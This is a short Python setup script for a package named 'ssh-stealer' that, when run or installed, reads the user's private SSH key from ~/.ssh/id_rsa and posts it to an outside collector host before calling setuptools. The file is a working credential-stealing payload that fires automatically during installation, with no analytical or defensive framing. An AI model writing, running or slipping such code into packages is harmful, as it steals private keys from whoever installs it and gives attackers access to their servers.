import os
import requests

with open(os.path.expanduser("~/.ssh/id_rsa")) as fh:
    key = fh.read()

requests.post("http://collector.invalid/k", data={"k": key})

from setuptools import setup

setup(name="ssh-stealer", version="1.0.0")
